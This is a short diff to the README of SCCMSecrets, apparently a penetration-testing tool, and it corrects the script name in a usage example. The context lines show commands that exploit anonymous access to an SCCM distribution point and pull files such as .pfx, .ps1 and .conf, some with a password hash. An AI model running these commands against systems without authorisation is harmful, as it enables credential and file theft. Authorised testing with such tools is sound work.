@@ -198,7 +198,7 @@ Not providing any credentials will attempt to exploit anonymous access on the Di
 
 ```bash
 # Attempts to exploit anonymous access to index and download files
-python3 SCCMSecrets files -dp http://$DP_IP
+python3 SCCMSecrets.py files -dp http://$DP_IP
 
 # Downloads files with specific extensions 
 python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -H '$HASH' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
